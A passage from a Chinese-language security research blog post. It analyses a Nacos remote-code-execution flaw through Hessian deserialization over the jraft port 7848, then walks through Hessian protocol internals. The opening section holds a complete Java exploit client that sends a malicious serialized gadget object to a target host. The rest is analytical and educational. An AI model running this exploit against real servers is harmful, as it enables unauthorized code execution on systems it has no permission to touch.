href="https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae">https://github.com/alibaba/nacos/pull/10542/commits/5804f5a46116dc1197bdd2c224d1368227b51232#diff-c8b875833c2f8a21ed873c9c1053b237ab04d4180caeea141e51c1932f665dae</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/4.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/5.png"></p><p>这里就是Hessian反序列化的触发点，nacos官方对方法com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply写了测试用例：com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessorTest#testOnApply，在这个例子中可以看到方法将实际序列化&#x2F;反序列化操作的MetadataOperation对象放入WriteRequest#data_参数中、将操作标识ADD放入<code>operation_</code>参数中</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/6.png"></p><p>接着我们根据sofastack的jraft用户指南编写Jraft客户端将数据发送至7848端口的jraft服务，<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/">https://www.sofastack.tech/projects/sofa-jraft/counter-example/</a></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/7.png"></p><p>碰到错误：<code>null default instance: com.alibaba.nacos.consistency.entity.WriteRequest</code></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/8.png"></p><p>经过调试是com.alipay.sofa.jraft.rpc.impl.GrpcClient#parserClasses中未包含com.alibaba.nacos.consistency.entity.WriteRequest</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/9.png"></p><p>所以在运行exp前需要将WriteRequest添加到parserClasses、defaultMarshallerRegistry(marshaller方法会用到)参数中，找到了com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactory类，可调用registerProtobufSerializer方法进行添加</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper</span>.</span></span>get<span class="hljs-constructor">Object()</span>))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br><span class="hljs-comment">//parserClasses、defaultMarshallerRegistry添加WriteRequest</span><br>GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/10.png"></p><p>最终构造好的exp：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import com.alibaba.nacos.consistency.entity.WriteRequest;<br>import com.alibaba.nacos.consistency.serialize.HessianSerializer;<br>import com.alipay.sofa.jraft.RouteTable;<br>import com.alipay.sofa.jraft.conf.Configuration;<br>import com.alipay.sofa.jraft.entity.PeerId;<br>import com.alipay.sofa.jraft.option.CliOptions;<br>import com.alipay.sofa.jraft.rpc.impl.GrpcRaftRpcFactory;<br>import com.alipay.sofa.jraft.rpc.impl.MarshallerRegistry;<br>import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br>import com.alipay.sofa.jraft.util.Endpoint;<br>import com.alipay.sofa.jraft.util.RpcFactoryHelper;<br>import com.google.protobuf.ByteString;<br><br>public <span class="hljs-keyword">class</span> JraftClient &#123;<br>    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;<br>        String groupId = <span class="hljs-string">&quot;naming_instance_metadata&quot;</span>;<br>        <span class="hljs-comment">// 更新raft group配置</span><br>        Configuration conf = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Configuration()</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.update<span class="hljs-constructor">Configuration(<span class="hljs-params">groupId</span>, <span class="hljs-params">conf</span>)</span>;<br><br>        <span class="hljs-comment">//创建ClientService</span><br>        CliClientServiceImpl cliClientService = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliClientServiceImpl()</span>;<br>        CliOptions cliOptions = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CliOptions()</span>;<br>        cliClientService.init(cliOptions);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.refresh<span class="hljs-constructor">Leader(<span class="hljs-params">cliClientService</span>, <span class="hljs-params">groupId</span>, 1000000)</span>;<br>        PeerId leader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RouteTable</span>.</span></span>get<span class="hljs-constructor">Instance()</span>.select<span class="hljs-constructor">Leader(<span class="hljs-params">groupId</span>)</span>;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;Leader is &quot;</span> + leader);<br><br>        <span class="hljs-comment">//创建writeRequest</span><br>        WriteRequest writeRequest = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WriteRequest</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Builder()</span>.set<span class="hljs-constructor">Data(ByteString.<span class="hljs-params">copyFrom</span>(<span class="hljs-params">new</span> HessianSerializer()</span>.serialize(evilSerData))).set<span class="hljs-constructor">Group(<span class="hljs-params">groupId</span>)</span>.set<span class="hljs-constructor">Operation(<span class="hljs-string">&quot;Write&quot;</span>)</span>.build<span class="hljs-literal">()</span>;<br><br>        <span class="hljs-comment">//parserClasses、defaultMarshallerRegistry添加WriteRequest</span><br>        GrpcRaftRpcFactory raftRpcFactory = (GrpcRaftRpcFactory) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">RpcFactoryHelper</span>.</span></span>rpc<span class="hljs-constructor">Factory()</span>;<br>        raftRpcFactory.register<span class="hljs-constructor">ProtobufSerializer(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>,writeRequest);<br>        MarshallerRegistry marshallerRegistry = raftRpcFactory.get<span class="hljs-constructor">MarshallerRegistry()</span>;<br>        marshallerRegistry.register<span class="hljs-constructor">ResponseInstance(WriteRequest.<span class="hljs-params">class</span>.<span class="hljs-params">getName</span>()</span>, writeRequest);<br><br>        <span class="hljs-comment">//发送请求</span><br>        cliClientService.get<span class="hljs-constructor">RpcClient()</span>.invoke<span class="hljs-constructor">Sync(<span class="hljs-params">new</span> Endpoint(<span class="hljs-string">&quot;host&quot;</span>, 7848)</span>, writeRequest, <span class="hljs-number">10000</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3、Hessian反序列化"><a href="#3、Hessian反序列化" class="headerlink" title="3、Hessian反序列化"></a>3、Hessian反序列化</h2><p>客户端构造好了，接着就是去构造恶意的序列化数据。其实就是找Hessian链，最开始用的是 <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> 中的SpringPartiallyComparableAdvisorHolder链，但是需要打jndi，过程中也碰到了构造数据时意外触发toString方法就会直接触发rce的问题，所以最后用了jdk原生的PKCS9Attribute触发bcel的反序列化链完成了RCE，在完成exp编写后想着对Hessian的了解不多，索性再花些时间整体看看Hessian反序列化的要点、利用及坑点，下次再碰到类似问题可以快速解决，提高分析效率。</p><h3 id="3-1-Hessian历史"><a href="#3-1-Hessian历史" class="headerlink" title="3.1 Hessian历史"></a>3.1 Hessian历史</h3><p>Hessian是一种用于连接WEB得简单二进制协议，由caucho( <a href="https://caucho.com/">https://caucho.com/</a> )开发，从06年发布3.0.20版本到19年发布的4.0.60版本，实际在maven仓库中可以下载到最新的4.0.66版本： <a href="https://mvnrepository.com/artifact/com.caucho/hessian">https://mvnrepository.com/artifact/com.caucho/hessian</a></p><p>Hessian虽然默认集成在resin中，但是使用起来只需要com.caucho.hessian.client、com.caucho.hessian.server包，并不需要其他的Resin类。所以也可以用于较小的客户端applet、用于手机&#x2F;电子游戏机等j2ME设备连接Resin服务器，也可以用于EJB服务。整体分为Hessian1与Hessian2两个版本，在实际使用中以序列化数据中的header进行区分。</p><p>Hessian由于其跨语言、小型轻量级、快速紧凑，所以在RPC框架应用中极为流行。</p><p>官网链接：<a href="http://hessian.caucho.com/">http://hessian.caucho.com/</a></p><h3 id="3-2-序列化反序列化过程"><a href="#3-2-序列化反序列化过程" class="headerlink" title="3.2 序列化反序列化过程"></a>3.2 序列化反序列化过程</h3><p>我们模拟一次客户端使用Hessian协议与服务端的一次交互过程来分析下该协议是如何处理数据的。Hessian的使用一般有两种形式：1、基于Web Servlet；2、与Spring结合使用。本次演示我们基于Web Servlet的形式来分析</p><p>总体来说利用Hessian协议进行一次远程方法调用：客户端-&gt;序列化数据发送到服务端-&gt;服务端反序列化数据并调用方法-&gt;服务端将方法执行结果进行序列化并返回给客户端-&gt;客户端反序列化数据拿到方法的执行结果</p><p>与其他RPC协议如RMI调用类似，也是基于序列化数据进行传输，那么我们深入代码看看Hessian是如何处理的，存在哪些安全风险~</p><h4 id="3-2-1-基于Web-Servlet形式"><a href="#3-2-1-基于Web-Servlet形式" class="headerlink" title="3.2.1 基于Web Servlet形式"></a>3.2.1 基于Web Servlet形式</h4><p>服务端引入com.caucho-hessian-4.0.63.jar，servlet可以为HessianServlet、也可以是继承自HessianServlet的自实现类，我这里演示在web.xml中将HessianServlet作为路由&#x2F;hessian的处理handler，并将其暴露给客户端进行调用，初始化参数配置客户端可调用的目标类BasicService</p><p>1、web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>service-class<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>com.example.hessianserver.BasicService<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hessianServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hessian<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>2、接口及实现类</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title class_">BasicAPI</span>接口<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-title class_">String</span> greeting);<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-title class_">Object</span> obj);<br>&#125;<br><br><span class="hljs-title class_">BasicService</span>实现类<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BasicAPI</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> _greeting = <span class="hljs-string">&quot;Hello, world&quot;</span>;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setGreeting</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> greeting</span>) &#123;<br>        _greeting = greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> _greeting;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">User</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;pwnull&quot;</span>, <span class="hljs-string">&quot;pwnull&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> obj</span>) &#123;<br>        <span class="hljs-keyword">return</span> obj.<span class="hljs-title function_">toString</span>();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p> 3、User pojo类：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> implements Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">153519254199840035L</span>;<br>    <span class="hljs-type">String</span> userName = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-type">String</span> password = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(<span class="hljs-type">String</span> user, <span class="hljs-type">String</span> pwd)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.userName = user;<br>        <span class="hljs-keyword">this</span>.password = pwd;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getUserName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> userName;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getPassword</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>客户端调用：</p><p>同样引入com.caucho-hessian-4.0.63.jar，再创建与服务端一样的BasicService接口及User pojo类，客户端通过HessianProxyFactory工厂类创建代理对象并进行方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><span class="hljs-keyword">import</span> com.example.hessianserver.BasicAPI;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>        <span class="hljs-type">SnmpAcl</span> <span class="hljs-variable">snmpAcl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SnmpAcl</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-comment">//factory.setHessian2Request(true);</span><br>        <span class="hljs-comment">//factory.setHessian2Reply(true);</span><br>        <span class="hljs-type">BasicAPI</span> <span class="hljs-variable">basic</span> <span class="hljs-operator">=</span> (BasicAPI) factory.create(BasicAPI.class, url);<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.hello());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getUserName());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getPassword());<br>        <span class="hljs-comment">//System.out.println(basic.getObject(snmpAcl));</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/11.png"></p><p>如下分析是基于最新版4.0.63，由于之前重点分析过rmi协议，再次看hessian RPC协议时感觉非常顺畅。整体流程与RMI类似，但是对于自定义类的处理与RMI不同，因此相对应的漏洞利用方式也有些区别。继续看</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">String</span> url =<span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br>BasicAPI basic = (BasicAPI) <span class="hljs-keyword">factory</span>.create(BasicAPI.<span class="hljs-keyword">class</span>, url);<br>basic.hello();<br></code></pre></td></tr></table></figure><p>在客户端调用远端的hello方法时，处理逻辑在com.caucho.hessian.client.HessianProxy#invoke中：1、判断调用方法是否是内置方法，如果是那么会在本地执行并返回结果；2、如果是远端方法，会调用HessianProxy#sendRequest进行数据组装并发送；3、客户端等待服务端返回方法的执行结果，Hessian传输的是序列化数据，所以在拿到结果后需要进行反序列化读取</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/12.png"></p><p>在HessianProxy#sendRequest中添加Hessian的header请求头、在HessianOutput#call中组装数据、序列化写入参数对象</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/13.png"></p><p>客户端调用Hessian2Input#readReply 反序列化读取服务端的返回数据</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/14.png"></p><p>服务端在HessianServlet#service方法中处理客户端的调用请求</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/15.png"></p><p>在HessianSkeleton#invoke中读取数据的header字段，这里默认是CALL_1_REPLY_2，表示使用版本协议1调用，使用版本协议2返回，并创建了对应版本的HessianInput（版本1）输入流、Hessian2Output（版本2）输出流</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/16.png"></p><p>在HessianSkeleton#invoke方法中：1、获取目标方法；2、获取方法对应参数；3、反射调用；4、将方法的执行结果通过AbstractHessianOutput#writeReply方法写入流中并传回给客户端</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/17.png"></p><p>服务端在处理过程中用到的几个重点类及方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.services</span><span class="hljs-selector-class">.server</span>.AbstractSkeleton<span class="hljs-selector-id">#AbstractSkeleton</span><br>初始化时接收调用接口类型，并将接口方法添加到属性_methodMap中，其格式为：方法名__参数长度、方法名_参数<span class="hljs-number">1</span>类型_参数<span class="hljs-number">2</span>类型<br><br>com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.HessianSkeleton</span><br>继承自AbstractSkeleton，初始化时接收接口与实现类，并将实现类赋值给属性service<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/18.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/19.png"></p><p>如上是一次完整的客户端与服务端的调用交互过程，在调用序列化writeObject&#x2F;反序列化readObject方法时，都会根据目标类型选择不同的序列化&#x2F;反序列化器。我们整体来看下</p><h4 id="3-2-2-序列化-x2F-反序列化器"><a href="#3-2-2-序列化-x2F-反序列化器" class="headerlink" title="3.2.2 序列化&#x2F;反序列化器"></a>3.2.2 序列化&#x2F;反序列化器</h4><p>根据<code>SerializerFactory#getDefaultSerializer跟</code>来分析，默认的序列化&#x2F;反序列化器是 UnsafeSerializer&#x2F;UnsafeDeserializer，当客户端序列化自定义Object对象（例子为SnmpAcl对象）时，会调用UnsafeSerializer#writeObject，这个方法兼容了Hessian1与Hessian2的格式写法：统一调用AbstractHessianOutput#writeObjectBegin，Hessian1的HessianOutput未实现此方法，所以会调用到HessianOutput#writeMapBegin写入Map的格式数据，而Hessian2实现了此方法，所以会调用到Hessian2Output#writeObjectBegin，不写入Map的格式数据</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/20.png"></p><p>com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/21.png"></p><p>Hessian1自定义类型的序列化初始方法：com.caucho.hessian.io.HessianOutput#writeMapBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/22.png"></p><p>Hessian2自定义类型的序列化初始方法：com.caucho.hessian.io.Hessian2Output#writeObjectBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/23.png"></p><p>当使用Hessian1协议传输自定义数据类型时，服务端总会使用UnsafeDeserializer#readMap进行处理：1、使用_unsafe.allocateInstance创建目标类实例；2、调用目标类属性对应类型的反序列化器，readXXX方法读取属性值并调用Unsafe#putObject写入</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/24.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/25.png"></p><p>当使用Hessian2协议传输自定义数据类型时，服务端会使用UnsafeDeserializer#readObject进行处理：1、使用_unsafe.allocateInstance创建目标类实例；2、调用目标类属性对应类型的反序列化器，readXXX方法读取属性值并调用Unsafe#putObject写入</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/26.png"></p><p>所以在Hessian1中，自定义数据类型都是包装为Map类型进行序列化&#x2F;反序列化操作的，Hessian1没有对Object进行单独处理。到了Hessian2中，才对自定义数据类型（Object）进行了单独处理。这个特性需要注意下。</p><p>另外要注意客户端默认为Hessian1格式请求、以Hessian2格式响应，即上面提到的header字段<code>CALL_1_REPLY_2</code>，当然也可以使用setHessian2Request&#x2F;setHessian2Reply方法显式指定请求及响应的协议版本</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br><span class="hljs-keyword">factory</span>.setHessian2Request(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">factory</span>.setHessian2Reply(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure><p>com.caucho.hessian.client.HessianProxyFactory#getHessianOutput </p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/27.png"></p><h4 id="3-2-3-Serializable接口问题"><a href="#3-2-3-Serializable接口问题" class="headerlink" title="3.2.3 Serializable接口问题"></a>3.2.3 Serializable接口问题</h4><p>客户端调用远程方法时，获取默认序列化器UnsafeSerializer时会判断类是否实现Serializable接口，或者<strong>判断是否设置了变量isAllowNonSerializable</strong>，如果isAllowNonSerializable设置为true，则允许序列化未实现Serializable接口的类，并且服务端不会检测类是否实现了Serializable接口。<strong>这个是与Java原生反序列化不同的一个点：Hessian可以对未实现Serializable接口的类对象进行序列化&#x2F;反序列化操作</strong></p><p>com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/28.png"></p><h3 id="3-3-漏洞及利用"><a href="#3-3-漏洞及利用" class="headerlink" title="3.3 漏洞及利用"></a>3.3 漏洞及利用</h3><p>从上面的分析能看出来，无论Hessian1还是2，在处理自定义类型（Object）对象都是通过<code>_unsafe.allocateInstance</code>创建实例、readObject获取值、<code>Unsafe#putObject</code>写入属性值。其中readObject方法与java原生反序列化流程也不同，不会在过程中调用目标类的readObject方法。与fastjson反序列化也不同，不会调用目标属性的getter&#x2F;setter方法进行赋值。那么有哪些触发点可以供我们使用？答案就是Map！Map在Hessian反序列化中占有重要地位</p><p>Hessian对于Map类型的反序列化处理在com.caucho.hessian.io.MapDeserializer#readMap中，初始化HashMap、TreeMap，接着调用各自的put方法，而map的put方法一直是反序列化链的”明星”方法，出场率极高。</p><p><img 